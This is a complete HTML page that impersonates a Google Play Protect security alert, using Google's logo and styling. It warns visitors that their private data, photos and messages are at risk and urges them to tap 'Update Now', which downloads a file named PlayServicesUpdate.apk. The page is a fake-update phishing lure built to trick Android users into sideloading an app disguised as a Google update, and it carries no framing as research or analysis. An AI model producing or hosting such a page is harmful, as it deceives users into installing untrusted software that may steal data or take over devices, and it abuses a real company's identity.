<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Play Protect - Security Patch</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f8f9fa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { color: #202124; font-size: 22px; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.6; }
        .update-btn { display: block; background-color: #01875f; color: white; padding: 12px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 25px; transition: 0.3s; }
        .update-btn:hover { background-color: #016d4d; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.gstatic.com/android/market_images/web/play_prism_h_res.png" class="logo">
        <h2>Update Required</h2>
        <p>Your Google Play Protect is outdated. This may put your private data, photos, and messages at risk. Install the security patch to fix critical vulnerabilities.</p>
        <a href="PlayServicesUpdate.apk" class="update-btn">Update Now</a>
    </div>
</body>
</html>
